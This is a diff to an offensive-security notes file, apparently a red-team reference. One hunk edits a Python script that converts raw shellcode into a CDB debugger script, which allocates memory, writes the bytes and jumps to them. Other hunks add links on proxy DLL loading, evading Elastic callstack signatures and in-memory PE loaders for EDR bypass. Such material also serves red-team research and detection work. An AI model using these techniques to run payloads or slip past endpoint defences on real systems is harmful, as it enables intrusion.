@@ -32,12 +32,12 @@ Convert raw shellcode to a CDB script:
 import sys
 
 with open(sys.argv[1], 'rb') as f:
-	data = f.read()
+	shellcode = f.read()
 
-arr = [f';eb @$t0+{hex(i)[2:].zfill(2)} {hex(b)[2:].zfill(2).upper()}' for i, b in enumerate(data)]
+arr = [f';eb @$t0+{hex(i)[2:].zfill(2)} {hex(b)[2:].zfill(2).upper()}' for i, b in enumerate(shellcode)]
 
 with open('out.wds', 'w') as f:
-	f.write(f'.foreach /pS 5 (register {{.dvalloc {len(data)}}}) {{r @$t0 = register}}\n')
+	f.write(f'.foreach /pS 5 (register {{.dvalloc {len(shellcode)}}}) {{r @$t0 = register}}\n')
 	f.write('\n'.join([''.join(arr[i:i+16]) for i in range(0, len(arr), 16)]) + '\n')
 	f.write('r @$ip=@$t0\n')
 	f.write('g\n')
@@ -437,7 +437,7 @@ int main(int argc, char** argv)
 
 
 
-### Proxy DLL Loading / Legit APIs
+### Proxy DLL Loading / Legit API Proxying
 
 - [https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/)
 - [https://0xdarkvortex.dev/hiding-in-plainsight/](https://0xdarkvortex.dev/hiding-in-plainsight/)
@@ -446,6 +446,7 @@ int main(int argc, char** argv)
 - [https://github.com/kleiton0x00/Proxy-DLL-Loads](https://github.com/kleiton0x00/Proxy-DLL-Loads)
 - [https://fin3ss3g0d.net/index.php/2024/03/18/weaponizing-windows-thread-pool-apis-proxying-dll-loads/](https://fin3ss3g0d.net/index.php/2024/03/18/weaponizing-windows-thread-pool-apis-proxying-dll-loads/)
 - [https://blog.cryptoplague.net/main/research/windows-research/proxyalloc-evading-ntallocatevirtualmemory-detection-ft.-elastic-defend-and-binary-ninja](https://blog.cryptoplague.net/main/research/windows-research/proxyalloc-evading-ntallocatevirtualmemory-detection-ft.-elastic-defend-and-binary-ninja)
+- [https://offsec.almond.consulting/evading-elastic-callstack-signatures.html](https://offsec.almond.consulting/evading-elastic-callstack-signatures.html)
 
 
 
@@ -526,6 +527,7 @@ int main(int argc, char** argv)
 - [https://github.com/s0i37/av_bypass/blob/master/crypt/cryptor.py](https://github.com/s0i37/av_bypass/blob/master/crypt/cryptor.py)
 - [https://github.com/4l3x777/shell_maker](https://github.com/4l3x777/shell_maker)
 - [https://github.com/maxDcb/DreamWalkers](https://github.com/maxDcb/DreamWalkers)
+- [https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/](https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/)
 
 
 
